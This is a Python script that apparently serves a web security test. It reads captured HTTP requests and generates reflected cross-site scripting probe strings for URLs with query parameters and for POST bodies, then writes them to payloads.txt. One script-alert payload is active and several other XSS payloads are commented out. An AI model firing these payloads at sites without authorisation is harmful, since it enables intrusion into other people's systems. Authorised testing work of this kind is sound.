import json
import re

# Load the request data from request.json
def load_requests(filename):
    with open(filename, 'r') as file:
        return json.load(file)

# Generate optimized reflected XSS payloads based on URLs and request methods
def generate_payloads(requests):
    payloads = []

    # Optimized reflected XSS payloads
    optimized_xss_payloads = [
        "<script>alert('XSS')</script>",   #Basic script injection
        # "<img src=x onerror=alert('XSS')>",   Image-based injection
        # "'><script>alert('XSS')</script>",   Injection in query parameters
        # "<svg/onload=alert('XSS')>",   SVG injection
        # "<a href='javascript:alert(1)'>Click me</a>"   Link-based injection
    ]
    
    # Iterate over requests and focus on URLs with query parameters
    for req in requests:
        method = req.get('method')
        url = req.get('url')

        if url and method:
            # Check for query parameters in the URL
            if '?' in url:  # Only target URLs with query parameters
                if method == "GET":
                    # Inject payloads in query parameters for GET requests
                    for payload in optimized_xss_payloads:
                        payloads.append(f"{url}&param={payload}")  # Append to existing params
                elif method == "POST":
                    # Inject payloads in the POST body
                    for payload in optimized_xss_payloads:
                        payloads.append(f"POST body: param={payload}")  # Use a generic parameter name

    return list(set(payloads))  # Return unique payloads

# Save payloads to payloads.txt
def save_payloads_to_file(payloads, filename):
    with open(filename, 'w') as file:
        for payload in payloads:
            file.write(f"{payload}\n")

# Main function
if __name__ == "__main__":
    requests = load_requests("request.json")
    
    payloads = generate_payloads(requests)
    save_payloads_to_file(payloads, "payloads.txt")

    print(f"Generated {len(payloads)} optimized payloads and saved to payloads.txt")
